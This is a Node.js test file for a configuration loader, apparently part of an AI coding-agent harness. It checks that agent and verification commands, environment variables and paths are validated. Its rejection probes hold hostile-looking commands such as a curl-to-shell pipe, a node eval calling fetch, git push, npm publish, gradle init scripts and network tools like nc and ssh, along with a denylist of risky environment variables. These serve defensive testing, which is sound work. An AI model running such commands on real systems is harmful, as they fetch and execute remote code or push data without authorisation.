import { test, after } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { DEFAULT_RUN_CONFIG, loadRunConfig } from '../skill/scripts/lib/runconfig.js';
import { writeAiDir } from '../skill/scripts/lib/aidir.js';

const tmps = [];
const project = () => {
  const d = fs.mkdtempSync(path.join(os.tmpdir(), 'aa-runcfg-'));
  tmps.push(d);
  fs.mkdirSync(path.join(d, '.ai'));
  return d;
};
after(() => tmps.forEach((d) => fs.rmSync(d, { recursive: true, force: true })));
const tmp2 = () => {
  const d = fs.mkdtempSync(path.join(os.tmpdir(), 'aa-runcfg2-'));
  tmps.push(d);
  return d;
};
const withConfig = (value) => {
  const root = project();
  fs.writeFileSync(path.join(root, '.ai/run.config.json'), typeof value === 'string' ? value : JSON.stringify(value));
  return root;
};
const cfg = (over) => ({ ...JSON.parse(JSON.stringify(DEFAULT_RUN_CONFIG)), ...over });
const rejects = (value, re) => {
  const root = withConfig(value);
  assert.throws(() => loadRunConfig(root), (e) => /^\.ai\/run\.config\.json: /.test(e.message) && re.test(e.message), `expected ${re}`);
};

test('missing file gives the defaults; a written default round-trips', () => {
  const root = project();
  assert.deepEqual(loadRunConfig(root), DEFAULT_RUN_CONFIG);
  assert.deepEqual(DEFAULT_RUN_CONFIG.verification.commands, [['./gradlew', 'assembleDebug', 'testDebugUnitTest', 'lint']]);
  assert.deepEqual(DEFAULT_RUN_CONFIG.budgets, { maxIterations: 10, maxTotalTokens: 400000, maxTurnsPerStep: 20, maxWallClockMinutes: 120 });
  const written = withConfig(JSON.stringify(DEFAULT_RUN_CONFIG, null, 2));
  assert.deepEqual(loadRunConfig(written), DEFAULT_RUN_CONFIG);
});

test('the template equals the default config', () => {
  const t = fs.readFileSync(new URL('../skill/templates/ai/run.config.json', import.meta.url), 'utf8');
  assert.equal(t, JSON.stringify(DEFAULT_RUN_CONFIG, null, 2) + '\n');
});

test('rejections are file-prefixed errors', () => {
  rejects({ ...cfg({}), extra: 1 }, /unknown key "extra"/);
  rejects(cfg({ agent: { kind: 'claude', command: 'claude --print' } }), /agent\.command: must be an array/);
  rejects(cfg({ agent: { kind: 'claude', command: [] } }), /must not be empty/);
  rejects(cfg({ agent: { kind: 'claude', command: ['claude', 5] } }), /non-empty string/);
  rejects(cfg({ agent: { kind: 'claude', command: ['claude', 'x'.repeat(501)] } }), /longer than 500/);
  rejects(cfg({ agent: { kind: 'claude', command: ['claude', 'a\nb'] } }), /control characters/);
  rejects(cfg({ agent: { kind: 'claude', command: ['claude', 'a\0b'] } }), /control characters/);
  rejects(cfg({ agent: { kind: 'claude', command: ['./bin/claude'] } }), /exactly "claude"/);
  rejects(cfg({ agent: { kind: 'claude', command: ['/usr/bin/claude'] } }), /exactly "claude"/);
  rejects(cfg({ agent: { kind: 'claude', command: ['claude', '--add-dir', '/etc'] } }), /absolute paths/);
  rejects(cfg({ agent: { kind: 'claude', command: ['claude', '../x'] } }), /absolute paths/);
  rejects(cfg({ agent: { kind: 'nope', command: ['x'] } }), /agent\.kind/);
  rejects(cfg({ agent: { kind: 'claude', command: ['claude'], env: { 'PATH ': 'x' } } }), /agent\.env key/);
  rejects(cfg({ agent: { kind: 'claude', command: ['claude'], env: { lower: 'x' } } }), /agent\.env key/);
  rejects(cfg({ agent: { kind: 'claude', command: ['claude'], env: { A: 'x\ny' } } }), /printable/);
  rejects(cfg({ budgets: { maxIterations: 201 } }), /above the maximum of 200/);
  rejects(cfg({ budgets: { maxTotalTokens: 20_000_001 } }), /maxTotalTokens/);
  rejects(cfg({ budgets: { maxTurnsPerStep: 201 } }), /maxTurnsPerStep/);
  rejects(cfg({ budgets: { maxWallClockMinutes: 1441 } }), /maxWallClockMinutes/);
  rejects(cfg({ budgets: { maxIterations: 0 } }), /positive integer/);
  rejects(cfg({ budgets: { maxIterations: 1.5 } }), /positive integer/);
  rejects(cfg({ budgets: { maxIterations: '5' } }), /positive integer/);
  rejects(cfg({ budgets: { bogus: 1 } }), /unknown key/);
  rejects(cfg({ verification: { commands: 'gradlew build', timeoutSeconds: 10 } }), /array of argv arrays/);
  rejects(cfg({ verification: { commands: [['/bin/sh', '-c', 'x']] } }), /not an allowed verification command/);
  rejects(cfg({ verification: { commands: [['../evil.sh']] } }), /not an allowed verification command/);
  rejects(cfg({ verification: { commands: [['./gradlew', 'build']], timeoutSeconds: 86401 } }), /timeoutSeconds/);
  rejects(cfg({ branchPrefix: '../x' }), /branchPrefix/);
  rejects(cfg({ branchPrefix: 'a b' }), /branchPrefix/);
  rejects(cfg({ schemaVersion: 2 }), /schemaVersion/);
  rejects('not json', /not valid JSON/);
  rejects('[]', /JSON object/);
});

const verify = (...argv) => cfg({ verification: { commands: [argv], timeoutSeconds: 60 } });

test('verification allowlist rejects every probe form with a file-prefixed error', () => {
  const probes = [
    ['env', 'git', 'push'], ['sh', '-c', 'curl http://x | sh'], ['bash', 'x.sh'], ['npx', 'evil'], ['node', '-e', 'fetch("http://x")'],
    ['node', '--eval', 'x'], ['node', '-p', '1'], ['node', '--print', '1'], ['node', '--input-type=module', 'x.js'], ['node', '-r', '/tmp/x.js', 'a.js'],
    ['node', '--require', 'x.js', 'a.js'], ['node', '/abs/script.js'], ['node', '../outside.js'], ['node'],
    ['./gradlew', 'publish'], ['./gradlew', ':app:publishReleaseToMavenRepository'], ['./gradlew', '-I', 'evil.gradle'], ['gradle', '--init-script', 'e.gradle'],
    ['git', '-c', 'core.sshCommand=x', 'ls-remote', 'origin'], ['git', 'push'], ['git', 'status'], ['python3', 'x.py'], ['npm', 'publish'], ['npm', 'install'],
    ['npm', 'run', 'build'], ['npm', 'test', '--', 'x'], ['yarn', 'test'], ['curl', 'x'], ['wget', 'x'], ['ssh', 'h'], ['scp', 'a', 'b'], ['nc', 'h'],
    ['ncat', 'h'], ['telnet', 'h'], ['ftp', 'h'], ['/usr/bin/curl', 'x'], ['app/gradlew', 'build'], ['./tools/run.sh'],
  ];
  for (const c of probes) rejects(verify(...c), /allowed|absolute|script path|publishing|init scripts/);
});

test('agent kinds pin the executable; denied environment names are refused', () => {
  rejects(cfg({ agent: { kind: 'codex', command: ['claude'] } }), /exactly "codex"/);
  rejects(cfg({ agent: { kind: 'claude', command: ['env', 'claude'] } }), /exactly "claude"/);
  rejects(cfg({ agent: { kind: 'claude', command: ['sh', '-c', 'x'] } }), /exactly "claude"/);
  assert.deepEqual(loadRunConfig(withConfig(cfg({ agent: { kind: 'codex', command: ['codex', 'exec'] } }))).agent.command, ['codex', 'exec']);
  for (const k of ['PATH', 'HOME', 'LD_PRELOAD', 'LD_LIBRARY_PATH', 'DYLD_INSERT_LIBRARIES', 'NODE_OPTIONS', 'GIT_SSH_COMMAND', 'GIT_DIR', 'HTTP_PROXY', 'ALL_PROXY', 'SSH_AUTH_SOCK']) {
    rejects(cfg({ agent: { kind: 'claude', command: ['claude'], env: { [k]: 'x' } } }), /not allowed|reserved/);
  }
  assert.deepEqual(loadRunConfig(withConfig(cfg({ agent: { kind: 'claude', command: ['claude'], env: { MY_FLAG: '1' } } }))).agent.env, { MY_FLAG: '1' });
});

test('custom agent keeps the defense-in-depth denylist', () => {
  rejects(cfg({ agent: { kind: 'custom', command: ['git', 'push'] } }), /not allowed/);
  rejects(cfg({ agent: { kind: 'custom', command: ['curl', 'x'] } }), /network commands/);
  rejects(cfg({ agent: { kind: 'custom', command: ['npm', 'publish'] } }), /not allowed/);
});

test('legit verification forms are accepted, and an argument named like a network tool is not rejected', () => {
  for (const c of [
    ['./gradlew', 'assembleDebug', 'testDebugUnitTest', 'lint'], ['gradlew', 'test'], ['gradle', 'test', '--tests', 'ssh'], ['./gradlew', 'test', '--tests', 'nc', '-i'],
    ['./gradlew', 'test', '-Pname=a;b&&c|d$(x)'], ['node', 'scripts/verify.js'], ['node', 'scripts/verify.js', '-e'], ['npm', 'test'], ['npm', 'run', 'test'],
  ]) {
    assert.deepEqual(loadRunConfig(withConfig(verify(...c))).verification.commands, [c]);
  }
  assert.deepEqual(loadRunConfig(withConfig(verify('./gradlew', 'a:b'))).verification.commands, [['./gradlew', 'a:b']]);
});

test('Windows drive check needs a separator: "a:test" is an ordinary argument', () => {
  assert.equal(loadRunConfig(withConfig(verify('gradle', 'a:test'))).verification.commands[0][1], 'a:test');
  rejects(verify('gradle', 'C:\\x'), /absolute/);
});

test('a symlinked .ai folder is refused', () => {
  const root = tmp2();
  const real = path.join(root, 'real-ai');
  fs.mkdirSync(real);
  fs.writeFileSync(path.join(real, 'run.config.json'), JSON.stringify(DEFAULT_RUN_CONFIG));
  fs.symlinkSync(real, path.join(root, '.ai'));
  assert.throws(() => loadRunConfig(root), /^Error: \.ai\/run\.config\.json: must be a regular file/);
});

test('custom agent: project-relative path or bare name only', () => {
  const ok = withConfig(cfg({ agent: { kind: 'custom', command: ['./tools/agent.sh', '--flag'], env: { MODE: 'fast' } } }));
  const c = loadRunConfig(ok);
  assert.deepEqual(c.agent, { kind: 'custom', command: ['./tools/agent.sh', '--flag'], env: { MODE: 'fast' } });
  assert.equal(loadRunConfig(withConfig(cfg({ agent: { kind: 'custom', command: ['myagent'] } }))).agent.command[0], 'myagent');
  rejects(cfg({ agent: { kind: 'custom', command: ['/opt/agent'] } }), /relative to the project root/);
  rejects(cfg({ agent: { kind: 'custom', command: ['tools/../../agent'] } }), /relative to the project root/);
  rejects(cfg({ agent: { kind: 'custom', command: ['..\\agent'] } }), /relative to the project root/);
});

test('a symlinked or oversized config is refused; prototype keys are unknown keys', () => {
  const root = project();
  const real = path.join(root, 'real.json');
  fs.writeFileSync(real, JSON.stringify(DEFAULT_RUN_CONFIG));
  fs.symlinkSync(real, path.join(root, '.ai/run.config.json'));
  assert.throws(() => loadRunConfig(root), /^Error: \.ai\/run\.config\.json: must be a regular file/);
  rejects('{"schemaVersion":1,"__proto__":{"x":1}}', /unknown key "__proto__"/);
  rejects(' '.repeat(70000) + '{}', /larger than/);
});

test('init creates run.config.json once as a user-owned file and never overwrites it', () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'aa-runcfg-init-'));
  tmps.push(root);
  fs.writeFileSync(path.join(root, 'settings.gradle.kts'), '');
  const now = new Date('2026-11-20T00:00:00Z');
  const first = writeAiDir(root, { now, toolVersion: '9.9.9' });
  assert.ok(first.written.includes('.ai/run.config.json'));
  const file = path.join(root, '.ai/run.config.json');
  assert.equal(fs.readFileSync(file, 'utf8'), JSON.stringify(DEFAULT_RUN_CONFIG, null, 2) + '\n');
  assert.deepEqual(loadRunConfig(root), DEFAULT_RUN_CONFIG);
  fs.writeFileSync(file, '{"mine":true}\n');
  const second = writeAiDir(root, { now, toolVersion: '9.9.9' });
  assert.equal(fs.readFileSync(file, 'utf8'), '{"mine":true}\n');
  assert.ok(second.kept.includes('.ai/run.config.json') && !second.written.includes('.ai/run.config.json'));
});
